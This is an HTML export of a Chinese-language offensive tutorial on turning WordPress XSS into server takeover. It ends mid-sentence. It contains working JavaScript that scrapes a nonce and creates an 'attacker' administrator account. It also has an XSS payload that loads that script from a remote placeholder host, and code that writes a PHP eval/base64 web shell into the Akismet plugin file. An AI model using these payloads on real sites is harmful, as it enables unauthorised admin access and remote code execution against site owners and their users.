<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X93534d07d564f0835ad5f237fee06d205750af6"><span class="csECDA2D3">（从</span><span class="csDE05BCC">xss</span><span class="csECDA2D3">到</span><span class="csDE05BCC">getshell</span><span class="csECDA2D3">）</span><span class="csDE05BCC"> xss</span><span class="csECDA2D3">的深层次利用与探讨</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">今天我们的网站上公布了大量的</span><span class="cs8926E06">wp</span><span class="cs9C1B1871">的</span><span class="cs8926E06">xss</span><span class="cs9C1B1871">，那么这篇文章就是深入探讨如何深入利用</span><span class="cs8926E06">xss</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">联系邮箱：</span><span class="cs8926E06">ian@lcx.cc</span></p><h2 class="cs868C439D">
			<a name="通过js文件添加wp系统管理员"><span class="cs83F14626">通过</span><span class="csB2D98684">js</span><span class="cs83F14626">文件添加</span><span class="csB2D98684">wp</span><span class="cs83F14626">系统管理员</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X98c51d38482c4c2e666bef032097cd45489f52d"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、创建管理账号</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">举个例子，攻击者可以在其</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器上托管</span><span class="cs8926E06">JavaScript</span><span class="cs9C1B1871">文件，例如</span><span class="cs8926E06">wpaddadmin [.] js</span><span class="cs9C1B1871">（在链接中描述）。此</span><span class="cs8926E06">JavaScript</span><span class="cs9C1B1871">代码将添加一个</span><span class="cs8926E06">WordPress</span><span class="cs9C1B1871">管理员帐户，其用户名为</span><span class="cs8926E06">&ldquo; attacker&rdquo;</span><span class="cs9C1B1871">，密码为</span><span class="cs8926E06">&ldquo; attacker&rdquo;</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">// Send a GET request to the URL &#39;/wordpress/wp-admin/user-new.php&#39;, and extract the current &#39;nonce&#39; value &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var ajaxRequest = new XMLHttpRequest(); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.open(&quot;GET&quot;, requestURL, false); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.send(); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonce = nonceMatch[1]; &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and create a new user with an arbitrary username / password, as an Administrator &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest = new XMLHttpRequest(); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.open(&quot;POST&quot;, requestURL, true); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.send(params);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，攻击者可以使用以下</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">插入</span><span class="cs8926E06">JavaScript</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">&ldquo;&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;&rdquo;</span></p><h3 class="cs868C439D">
			<a name="图1插入xss代码以添加管理员帐户"><span class="csD6CA00D2">图</span><span class="csD1E291E2">1.</span><span class="csD6CA00D2">插入</span><span class="csD1E291E2">XSS</span><span class="csD6CA00D2">代码以添加管理员帐户</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_系统漏洞/%ef%bc%88%e4%bb%8exss%e5%88%b0getshell%ef%bc%89%20xss%e7%9a%84%e6%b7%b1%e5%b1%82%e6%ac%a1%e5%88%a9%e7%94%a8%e4%b8%8e%e6%8e%a2%e8%ae%a8_files/image0.png" width="560" height="385" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">具有高权限的受害者查看此帖子后，将创建管理员帐户</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">攻击者</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="图2-xss代码被执行"><span class="csD6CA00D2">图</span><span class="csD1E291E2">2. XSS</span><span class="csD6CA00D2">代码被执行</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_系统漏洞/%ef%bc%88%e4%bb%8exss%e5%88%b0getshell%ef%bc%89%20xss%e7%9a%84%e6%b7%b1%e5%b1%82%e6%ac%a1%e5%88%a9%e7%94%a8%e4%b8%8e%e6%8e%a2%e8%ae%a8_files/image1.png" width="560" height="385" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="图3-xss代码创建的具有管理员权限的攻击者帐户"><span class="csD6CA00D2">图</span><span class="csD1E291E2">3. XSS</span><span class="csD6CA00D2">代码创建的具有管理员权限的</span><span class="csD1E291E2">&ldquo;</span><span class="csD6CA00D2">攻击者</span><span class="csD1E291E2">&rdquo;</span><span class="csD6CA00D2">帐户</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_系统漏洞/%ef%bc%88%e4%bb%8exss%e5%88%b0getshell%ef%bc%89%20xss%e7%9a%84%e6%b7%b1%e5%b1%82%e6%ac%a1%e5%88%a9%e7%94%a8%e4%b8%8e%e6%8e%a2%e8%ae%a8_files/image2.png" width="560" height="383" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，攻击者可以将现有的</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件修改为</span><span class="cs8926E06">Webshel​​l</span><span class="cs9C1B1871">，并使用该</span><span class="cs8926E06">Webshel​​l</span><span class="cs9C1B1871">来控制</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">4.</span><span class="cs9C1B1871">使用攻击者的帐户添加一个</span><span class="cs8926E06">Web Shell</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_系统漏洞/%ef%bc%88%e4%bb%8exss%e5%88%b0getshell%ef%bc%89%20xss%e7%9a%84%e6%b7%b1%e5%b1%82%e6%ac%a1%e5%88%a9%e7%94%a8%e4%b8%8e%e6%8e%a2%e8%ae%a8_files/image3.png" width="560" height="383" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">5.</span><span class="cs9C1B1871">控制</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_系统漏洞/%ef%bc%88%e4%bb%8exss%e5%88%b0getshell%ef%bc%89%20xss%e7%9a%84%e6%b7%b1%e5%b1%82%e6%ac%a1%e5%88%a9%e7%94%a8%e4%b8%8e%e6%8e%a2%e8%ae%a8_files/image4.png" width="560" height="385" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X1a423ea132ce6e23efc75b50ca65197650a339c"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、恶意命令执行</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">// Send a GET request to the URL &#39;/wp-admin/plugin-editor.php?akisment/index.php&#39;, and extract the current &#39;nonce&#39; value</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var ajaxRequest = new XMLHttpRequest();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var requestURL = &quot;/wp-admin/plugin-editor.php?file=akismet/index.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonceRegex = /ce&quot; value=&quot;([^&quot;]*?)&quot;/g;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.open(&quot;GET&quot;, requestURL, false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.send();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var nonce = nonceMatch[1];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and update the content of the file &#39;akismet/index.php&#39; with our tiny web shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var params = &quot;_wpnonce=&quot;+nonce+&quot;&amp;newcontent=&lt;?php eval(base64_decode($_REQUEST[&#39;x&#39;]));&amp;action=update&amp;file=akismet/index.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest = new XMLHttpRequest();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.open(&quot;POST&quot;, requestURL, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ajaxRequest.send(params);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一旦此</span><span class="cs8926E06">XSS</span><span class="cs9C1B1871">被管理用户触发，我们应该能够通过向脚本</span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="http://0-sec.org/wp-content/plugins/akismet/index.php"><span class="cs4B51D5E4">http://0-sec.org/wp-content/plugins/akismet/index.php</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送</span><span class="cs8926E06">GET / POST</span><span class="cs9C1B1871">请求来执行任意</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码，其中参数</span><span class="cs8926E06">&ldquo; x&rdquo;</span><span class="cs9C1B1871">等于我们的</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码的</span><span class="cs8926E06">&ldquo; base6</span></p></body>
</html>
